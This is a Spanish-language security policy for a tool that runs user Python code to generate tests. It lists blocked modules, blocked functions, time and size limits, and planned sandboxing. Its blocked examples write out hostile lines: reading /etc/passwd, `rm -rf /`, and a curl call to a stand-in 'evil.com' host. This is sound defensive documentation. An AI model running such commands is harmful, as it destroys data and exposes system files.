# 🛡️ Política de Seguridad - AI Test Generator

## Limitaciones Implementadas

Para proteger el sistema, el código del usuario está sujeto a las siguientes restricciones:

### 1. 📦 Módulos Bloqueados

No se permite importar:

| Módulo | Razón |
|--------|-------|
| `os` | Ejecución de comandos del sistema |
| `subprocess` | Crear procesos |
| `sys` | Acceso a parámetros del sistema |
| `shutil` | Operaciones de archivos del sistema |
| `pathlib` | Manipulación de rutas |
| `importlib` | Importación dinámica |
| `socket` | Conexiones de red |
| `requests` | Solicitudes HTTP |
| `urllib` | Acceso a URLs |

### 2. 🚫 Funciones Bloqueadas

No se permite usar:

- `eval()` - Evaluación de código arbitrario
- `exec()` - Ejecución de código arbitrario
- `compile()` - Compilación de código
- `open()` - Acceso a archivos
- `__import__()` - Importación dinámica
- Atributos `__` (dunder attributes)
- `.system()` - Comandos del sistema
- `.popen()` - Procesos
- `.call()` - Llamadas del sistema
- `.run()` - Ejecución de procesos

### 3. ⏱️ Límites de Ejecución

- **Timeout**: 10 segundos máximo por ejecución
- **Tamaño de código**: 5000 caracteres máximo

### 4. 🔒 Entorno de Pruebas

- Los tests se ejecutan en carpetas temporales aisladas
- Se limpian automáticamente después de la ejecución
- No hay acceso al sistema de archivos
- No hay acceso a la red

## ✅ Código Seguro Permitido

Puedes usar libremente:

- ✅ Funciones Python estándar (sin I/O)
- ✅ Cálculos matemáticos
- ✅ Manipulación de strings
- ✅ Listas, diccionarios, tuplas
- ✅ Clases y objetos
- ✅ Excepciones (try/except)
- ✅ Decoradores
- ✅ Generadores
- ✅ Context managers (with)
- ✅ Lambdas
- ✅ Comprensiones (list/dict/set)

## 📝 Ejemplos de Código Válido

### Función Simple ✅
```python
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)
```

### Clase ✅
```python
class BankAccount:
    def __init__(self, balance=0):
        self.balance = balance
    
    def deposit(self, amount):
        self.balance += amount
        return self.balance
```

### Algoritmo ✅
```python
def quicksort(arr):
    if len(arr) <= 1:
        return arr
    pivot = arr[0]
    left = [x for x in arr[1:] if x < pivot]
    right = [x for x in arr[1:] if x >= pivot]
    return quicksort(left) + [pivot] + quicksort(right)
```

## ❌ Ejemplos de Código Bloqueado

### Acceso a archivos ❌
```python
with open('/etc/passwd') as f:
    data = f.read()
```

### Comandos del sistema ❌
```python
import os
os.system('rm -rf /')
```

### Importación peligrosa ❌
```python
import subprocess
subprocess.call(['curl', 'evil.com'])
```

### Código arbitrario ❌
```python
user_input = input("Enter code: ")
eval(user_input)
```

## 🚀 Próximas Mejoras de Seguridad

1. **Sandbox Docker** - Ejecutar en contenedor aislado
2. **User no-root** - Ejecutar con permisos limitados
3. **Resource limits** - Limitar CPU/memoria
4. **Whitelist de imports** - Solo módulos específicos
5. **AST analysis mejorado** - Análisis más profundo del código

## 📞 Reportar Problemas de Seguridad

Si encuentras una forma de eludir estas restricciones, por favor reporta responsablemente a:
- GitHub Issues (con label `security`)
- Privacy Policy

¡Gracias por ayudarnos a mantener el sistema seguro!
